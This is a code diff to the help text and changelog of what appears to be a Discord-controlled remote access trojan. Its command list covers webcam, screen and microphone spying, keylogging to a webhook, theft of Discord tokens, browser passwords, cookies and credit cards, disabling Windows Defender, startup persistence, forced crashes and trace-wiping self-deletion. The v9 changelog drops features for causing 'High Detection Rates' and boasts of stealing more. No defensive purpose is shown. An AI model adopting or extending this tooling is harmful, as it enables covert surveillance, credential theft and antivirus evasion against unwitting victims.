@@ -1,77 +1,272 @@
 /* ======= Full Commands ======= */
 const helpDict = {
-  "ping": { "explanation": "Checks if the bot is online and measures its response time.", "category": "Utility" },
-  "help": { "explanation": "Displays a list of all available commands and their descriptions.", "category": "Utility" },
-  "webcamphoto": { "explanation": "Takes a photo using the target's webcam.", "category": "Surveillance" },
-  "ss": { "explanation": "Captures a screenshot of the target's screen. On every Monitor.", "category": "Surveillance" },
-  "ipinfo": { "explanation": "Retrieves the target's public IP address and geolocation data.", "category": "System Info" },
-  "systeminfo": { "explanation": "Collects system details such as OS, CPU, RAM, and hostname.", "category": "System Info" },
-  "wifi": { "explanation": "Lists saved Wi-Fi networks and their passwords.", "category": "System Info" },
-  "antivirus": { "explanation": "Detects installed antivirus or security software.", "category": "System Info" },
-  "vpn": { "explanation": "Checks if a VPN connection is currently active.", "category": "System Info" },
-  "upload": { "explanation": "Uploads a file from your machine to the target system. Use an attachment or a direct URL.", "category": "File Management" },
-  "webcamvideo": { "explanation": "Records a short video clip from the target's webcam.", "category": "Surveillance" },
-  "screenvideo": { "explanation": "Records a video of the target's screen activity.", "category": "Surveillance" },
-  "cmd": { "explanation": "Executes a command in the target's command line.", "category": "Remote Control" },
-  "record": { "explanation": "Records audio from the target's microphone.", "category": "Surveillance" },
-  "shutdown": { "explanation": "Shuts down the target system.", "category": "Power Control" },
-  "restart": { "explanation": "Restarts the target system.", "category": "Power Control" },
-  "lock": { "explanation": "Locks the target's session.", "category": "Power Control" },
-  "sleep": { "explanation": "Puts the target system into sleep mode.", "category": "Power Control" },
-  "exit": { "explanation": "Stops the bot and closes its connection.", "category": "Utility" },
-  "cd": { "explanation": "Changes the current working directory on the target.", "category": "File Management" },
-  "ls": { "explanation": "Lists all files and folders in the current directory.", "category": "File Management" },
-  "run": { "explanation": "Runs a specified file or program on the target.", "category": "Remote Control" },
-  "dfile": { "explanation": "Downloads a specific file from the target machine.", "category": "File Management" },
-  "dfolder": { "explanation": "Downloads an entire folder from the target machine.", "category": "File Management" },
-  "token": { "explanation": "Searches for stored Discord tokens on the target.", "category": "Data Extraction" },
-  "proclist": { "explanation": "Lists all running processes on the target machine.", "category": "System Info" },
-  "kill": { "explanation": "Terminates a specified running process.", "category": "Remote Control" },
-  "linkopen": { "explanation": "Opens a specified URL in the target's default browser.", "category": "Remote Control" },
-  "rickroll": { "explanation": "Opens a Rickroll video in the target's browser.", "category": "Fun" },
-  "crash": { "explanation": "Forces the target machine to crash by using a BSOD.", "category": "Power Control" },
-  "selfdelete": { "explanation": "Deletes the bot from the target machine. And wipes all traces.", "category": "Utility" },
-  "desktopmess": { "explanation": "Creates random files on the desktop.", "category": "Fun" },
-  "history": { "explanation": "Retrieves browser history from the target machine. It supports multiple browsers.", "category": "Data Extraction" },
-  "wallpaper": { "explanation": "Changes the desktop wallpaper on the target.", "category": "Customization" },
-  "linkspam": { "explanation": "Opens multiple browser tabs with a given link.", "category": "Fun" },
-  "taskbarhide": { "explanation": "Hides the taskbar from the target's screen.", "category": "Customization" },
-  "taskbarshow": { "explanation": "Restores the taskbar if it was hidden.", "category": "Customization" },
-  "foreground": { "explanation": "Checks which App is currently focused on the target machine.", "category": "Utility" },
-  "home": { "explanation": "Changes the working directory to our home folder.", "category": "File Management" },
-  "keylogstart": { "explanation": "Starts recording keystrokes on the target system and sends it to the webhook.", "category": "Surveillance" },
-  "keylogstop": { "explanation": "Stops the keylogger.", "category": "Surveillance" },
-  "location": { "explanation": "Tries to get the physical location of the target device.", "category": "System Info" },
-  "admin": { "explanation": "Checks if the bot is running with administrator privileges.", "category": "Utility" },
-  "defenderstate": { "explanation": "Checks if Real-time protection is enabled.", "category": "Utility" },
-  "excludewindef": { "explanation": "ADMIN NEEDED + DISABLE DEFENDER\nAdds the bot's directory to Windows Defender's exclusion list.", "category": "Stealth" },
-  "requireadmin": { "explanation": "Restarts the bot with administrator privileges using a UAC prompt.", "category": "Utility" },
-  "disabledefender": { "explanation": "ADMIN NEEDED + DISABLE DEFENDER\nAttempts to disable Windows Defender real-time protection.", "category": "Utility" },
-  "giveadmin": { "explanation": "Gives the bot administrator privileges silently without a UAC prompt.", "category": "Utility" },
-  "micinfo": { "explanation": "Lists all microphone devices and their details.", "category": "Surveillance" },
-  "livemic": { "explanation": "Streams live audio from the target's microphone to the Discord channel.", "category": "Surveillance" },
-  "leave": { "explanation": "Stops the live microphone stream.", "category": "Surveillance" },
-  "currentmic": { "explanation": "Displays information about the currently active microphone.", "category": "Surveillance" },
-  "setmic": { "explanation": "Sets the active microphone to the specified device.", "category": "Surveillance" },
-  "stealall": { "explanation": "Steals everything at once: Discord tokens, browser passwords, cookies, credit cards, Wi-Fi passwords, system info, screenshots, webcam photo.", "category": "Data Extraction" },
-  "verifypaths": { "explanation": "Verifies that all necessary file paths and directories, registry keys exist for the bot to function correctly.", "category": "Utility" },
-  "volume": { "explanation": "Sets the device volume.", "category": "Surveillance" },
-  "ttx": { "explanation": "Speaks using the target's text-to-speech engine.", "category": "Utility" },
-  "key": { "explanation": "See the command `!keyhelp`", "category": "Utility" },
-  "keystop": { "explanation": "Attempts to stop the current key queue.", "category": "Utility" },
-  "msg": { "explanation": "Displays a message on the targets screen.", "category": "Utility" },
-  "keyhelp": { "explanation": "Sends a help command for the `!key` module.", "category": "Utility" },
-  "addstartup": { "explanation": "Adds a given file to startup registry.", "category": "Utility" },
-  "system": { "explanation": "Check if we have System privileges. NT Authority System", "category": "Utility" },
-  "givesystem": { "explanation": "Grants us System Privileges", "category": "Utility" },
-  "enableloc": { "explanation": "Enables Location Services", "category": "Utility" },
-  "disableloc": { "explanation": "Disables Location Services", "category": "Utility" },
-  "checkloc": { "explanation": "Checks if Location Services are enabled", "category": "Utility" },
-    "passwords": { "explanation": "Grabs passwords from Chrome, Edge and Brave", "category": "Data Extraction" },
+  "ping": {
+    "explanation": "Checks if the bot is online and measures its response time.",
+    "category": "Utility"
+  },
+  "help": {
+    "explanation": "Displays a list of all available commands and their descriptions.",
+    "category": "Utility"
+  },
+  "webcamphoto": {
+    "explanation": "Takes a photo using the target's webcam.",
+    "category": "Surveillance"
+  },
+  "ss": {
+    "explanation": "Captures a screenshot of the target's screen. On every Monitor.",
+    "category": "Surveillance"
+  },
+  "ipinfo": {
+    "explanation": "Retrieves the target's public IP address and geolocation data.",
+    "category": "System Info"
+  },
+  "systeminfo": {
+    "explanation": "Collects system details such as OS, CPU, RAM, and hostname.",
+    "category": "System Info"
+  },
+  "wifi": {
+    "explanation": "Lists saved Wi-Fi networks and their passwords.",
+    "category": "System Info"
+  },
+  "antivirus": {
+    "explanation": "Detects installed antivirus or security software.",
+    "category": "System Info"
+  },
+  "vpn": {
+    "explanation": "Checks if a VPN connection is currently active.",
+    "category": "System Info"
+  },
+  "upload": {
+    "explanation": "Uploads a file from your machine to the target system. Use an attachment or a direct URL.",
+    "category": "File Management"
+  },
+  "webcamvideo": {
+    "explanation": "Records a short video clip from the target's webcam.",
+    "category": "Surveillance"
+  },
+  "screenvideo": {
+    "explanation": "Records a video of the target's screen activity.",
+    "category": "Surveillance"
+  },
+  "cmd": {
+    "explanation": "Executes a command in the target's command line.",
+    "category": "Remote Control"
+  },
+  "record": {
+    "explanation": "Records audio from the target's microphone.",
+    "category": "Surveillance"
+  },
+  "shutdown": {
+    "explanation": "Shuts down the target system.",
+    "category": "Power Control"
+  },
+  "restart": {
+    "explanation": "Restarts the target system.",
+    "category": "Power Control"
+  },
+  "lock": {
+    "explanation": "Locks the target's session.",
+    "category": "Power Control"
+  },
+  "sleep": {
+    "explanation": "Puts the target system into sleep mode.",
+    "category": "Power Control"
+  },
+  "exit": {
+    "explanation": "Stops the bot and closes its connection.",
+    "category": "Utility"
+  },
+  "cd": {
+    "explanation": "Changes the current working directory on the target.",
+    "category": "File Management"
+  },
+  "ls": {
+    "explanation": "Lists all files and folders in the current directory.",
+    "category": "File Management"
+  },
+  "run": {
+    "explanation": "Runs a specified file or program on the target.",
+    "category": "Remote Control"
+  },
+  "dfile": {
+    "explanation": "Downloads a specific file from the target machine.",
+    "category": "File Management"
+  },
+  "dfolder": {
+    "explanation": "Downloads an entire folder from the target machine.",
+    "category": "File Management"
+  },
+  "proclist": {
+    "explanation": "Lists all running processes on the target machine.",
+    "category": "System Info"
+  },
+  "kill": {
+    "explanation": "Terminates a specified running process.",
+    "category": "Remote Control"
+  },
+  "linkopen": {
+    "explanation": "Opens a specified URL in the target's default browser.",
+    "category": "Remote Control"
+  },
+  "rickroll": {
+    "explanation": "Opens a Rickroll video in the target's browser.",
+    "category": "Fun"
+  },
+  "crash": {
+    "explanation": "Forces the target machine to crash by using a BSOD.",
+    "category": "Power Control"
+  },
+  "selfdelete": {
+    "explanation": "Deletes the bot from the target machine. And wipes all traces.",
+    "category": "Utility"
+  },
+  "desktopmess": {
+    "explanation": "Creates random files on the desktop.",
+    "category": "Fun"
+  },
+  "history": {
+    "explanation": "Retrieves browser history from the target machine. It supports multiple browsers.",
+    "category": "Data Extraction"
+  },
+  "wallpaper": {
+    "explanation": "Changes the desktop wallpaper on the target.",
+    "category": "Customization"
+  },
+  "linkspam": {
+    "explanation": "Opens multiple browser tabs with a given link.",
+    "category": "Fun"
+  },
+  "taskbarhide": {
+    "explanation": "Hides the taskbar from the target's screen.",
+    "category": "Customization"
+  },
+  "taskbarshow": {
+    "explanation": "Restores the taskbar if it was hidden.",
+    "category": "Customization"
+  },
+  "foreground": {
+    "explanation": "Checks which App is currently focused on the target machine.",
+    "category": "Utility"
+  },
+  "home": {
+    "explanation": "Changes the working directory to our home folder.",
+    "category": "File Management"
+  },
+  "keylogstart": {
+    "explanation": "Starts recording keystrokes on the target system and sends it to the webhook.",
+    "category": "Surveillance"
+  },
+  "keylogstop": {
+    "explanation": "Stops the keylogger.",
+    "category": "Surveillance"
+  },
+  "location": {
+    "explanation": "Tries to get the physical location of the target device.",
+    "category": "System Info"
+  },
+  "admin": {
+    "explanation": "Checks if the bot is running with administrator privileges.",
+    "category": "Utility"
+  },
+  "defender": {
+    "explanation": "Checks if Real-time protection is enabled.",
+    "category": "Utility"
+  },
+  "excludewindef": {
+    "explanation": "ADMIN NEEDED + DISABLE DEFENDER\nAdds the bot's directory to Windows Defender's exclusion list.",
+    "category": "Utility"
+  },
+  "requireadmin": {
+    "explanation": "Restarts the bot with administrator privileges using a UAC prompt.",
+    "category": "Utility"
+  },
+  "disabledefender": {
+    "explanation": "ADMIN NEEDED + DISABLE DEFENDER\nAttempts to disable Windows Defender real-time protection.",
+    "category": "Utility"
+  },
+  "micinfo": {
+    "explanation": "Lists all microphone devices and their details.",
+    "category": "Surveillance"
+  },
+  "livemic": {
+    "explanation": "Streams live audio from the target's microphone to the Discord channel.",
+    "category": "Surveillance"
+  },
+  "leave": {
+    "explanation": "Stops the live microphone stream.",
+    "category": "Surveillance"
+  },
+  "currentmic": {
+    "explanation": "Displays information about the currently active microphone.",
+    "category": "Surveillance"
+  },
+  "setmic": {
+    "explanation": "Sets the active microphone to the specified device.",
+    "category": "Surveillance"
+  },
+  "stealall": {
+    "explanation": "Steals everything at once: Discord tokens, browser passwords, cookies, credit cards, Wi-Fi passwords, system info, screenshots, webcam photo.",
+    "category": "Data Extraction"
+  },
+  "verifypaths" : {
+    "explanation": "Verifies that all necessary file paths and directories, registry keys exist for the bot to function correctly.",
+    "category": "Utility"
+  },
+  "volume": {
+      "explanation": "Sets the device volume.",
+      "category": "Surveillance"
+  },
+  "tts": {
+      "explanation": "Speaks using the target's text-to-speech engine.",
+      "category": "Utility"
+  },
+  "key": {
+      "explanation": "See the command `!keyhelp`",
+      "category": "Utility"
+  },
+  "keystop": {
+      "explanation": "Attempts to stop the current key queue.",
+      "category": "Utility"
+  },
+  "msg": {
+      "explanation": "Displays a message on the targets screen.",
+      "category": "Utility"
+  },
+  "keyhelp": {
+      "explanation": "Sends a help command for the `!key` module.",
+      "category": "Utility"
+  },
+  "addstartup": {
+      "explanation": "Adds a given file to startup registry.",
+      "category": "Utility"
+  }
 };
 
 /* ======= Changelog (multi-line, English) ======= */
 const changelog = [
+  { v: "v9", note: [
+    "BIG UPDATE",
+    "Removed commands that caused issues.",
+    "Removed:",
+    "!giveadmin",
+    "!givesystem",
+    "!passwords",
+    "!token",
+    "!disableloc",
+    "checkloc",
+    "I am really sorry for this but these were not perfect",
+    "and they caused High Detection Rates.",
+    "You can still do !requireadmin for administrative permissions",
+    "Renamed:",
+    "!ttx -> !tts",
+    "!defenderstate -> !defender",
+    "Upgraded:",
+    "!stealall -> Even more stuff stolen :3",
+    "!history -> Grabs up to 10k Entries now >;D",
+    "!dfile -> We now upload to a seperate filehost if the file is larger than 8Mb",
+    "!dfolder -> We now upload to a seperate filehost if the folder.zip is larger than 8Mb ",
+    ].join("\n")
+  },
   { v: "v8.5", note: [
     "Added !passwords",
     "Grabs passwords from Edge, Chrome and Brave",
